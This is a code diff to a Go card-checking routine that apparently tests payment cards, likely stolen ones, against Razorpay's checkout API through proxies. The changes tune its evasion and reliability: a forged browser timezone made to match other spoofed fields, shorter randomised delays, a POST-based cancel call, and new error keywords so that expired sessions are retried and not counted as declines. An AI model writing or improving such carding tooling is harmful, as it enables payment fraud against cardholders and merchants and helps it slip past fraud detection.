@@ -1808,11 +1808,11 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 		}
 	}
 
-	// Pre-payment delay: 8-15 seconds. Razorpay sometimes needs extra time
-	// to process all confirmations before the payment create step. Without
-	// sufficient delay, the payment may be submitted before Razorpay's
-	// internal state is ready, leading to false declines.
-	time.Sleep(time.Duration(randInt(8000, 15000)) * time.Millisecond)
+	// Pre-payment delay: 2-4 seconds.
+	// Previously 8-15s — that caused Razorpay checkout sessions to expire
+	// before payment was submitted, which Razorpay returns as "payment_cancelled".
+	// 2-4s is sufficient for Razorpay's internal state to settle.
+	time.Sleep(time.Duration(randInt(2000, 4000)) * time.Millisecond)
 
 	tokenCreate := base64.StdEncoding.EncodeToString([]byte(`[{"name":"sardine","metadata":{"session_id":"` + checkoutID + `"}}]`))
 
@@ -2009,7 +2009,7 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 		form8 := url.Values{
 			"browser[java_enabled]":       {"false"},
 			"browser[javascript_enabled]": {"true"},
-			"browser[timezone_offset]":    {"0"},
+			"browser[timezone_offset]":    {"-330"}, // IST = UTC+5:30 → offset = -330 min (matches form7 _[shield][tz])
 			"browser[color_depth]":        {strconv.Itoa(depth)},
 			"browser[screen_width]":       {strconv.Itoa(screen[0])},
 			"browser[screen_height]":      {strconv.Itoa(screen[1])},
@@ -2091,20 +2091,31 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 			}
 			return CheckResult{Status: "declined", Message: failDesc, Proxy: proxyRaw, ProxyStatus: "LIVE"}
 		}
+		if payStatus == "cancelled" || payStatus == "canceled" {
+			// Razorpay already cancelled this payment (session expired or
+			// duplicate cancel). Stop polling immediately — calling /cancel
+			// again would just return payment_cancelled error which we were
+			// previously misclassifying as a card decline.
+			return CheckResult{Status: "declined", Message: "Payment Cancelled", Proxy: proxyRaw, ProxyStatus: "LIVE"}
+		}
 		// "created" / "pending" / other → keep polling
 	}
 
 	// ── Fallback: cancel + check ─────────────────────────────────────────
 	// If polling didn't give us a definitive answer (still "created" /
-	// "pending" after 10s), fall back to the original cancel-and-check flow.
-	r9, err := fetch.Get(
+	// "pending" after 10s), fall back to cancel-and-check.
+	// Using POST — Razorpay's cancel endpoint expects POST, not GET.
+	// GET returned 405 in some cases and caused unexpected responses.
+	r9, err := fetch.PostForm(
 		fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/%s/cancel?key_id=%s&session_token=%s&keyless_header=%s", paymentID, kyid, sessid, keylessHeaderURL),
 		map[string]string{
-			"Accept":          "*/*",
+			"Accept":          "application/json, text/plain, */*",
 			"Content-type":    "application/x-www-form-urlencoded",
 			"Referer":         rzpRef,
 			"x-session-token": sessid,
+			"Origin":          "https://api.razorpay.com",
 		},
+		url.Values{},
 	)
 	if err != nil {
 		return makeProxyError(err, proxyRaw)
@@ -2250,6 +2261,11 @@ var serverErrorKeywords = []string{
 	"503 service unavailable",
 	"502 bad gateway",
 	"500 internal",
+	// payment_cancelled = Razorpay cancelled the session (expired / timed out),
+	// NOT a card decline. Must be retried with a fresh session, not treated as final.
+	"payment has been cancelled",
+	"payment_cancelled",
+	"has been cancelled. try again",
 }
 
 // isRazorpayServerError returns true if the error description looks like a
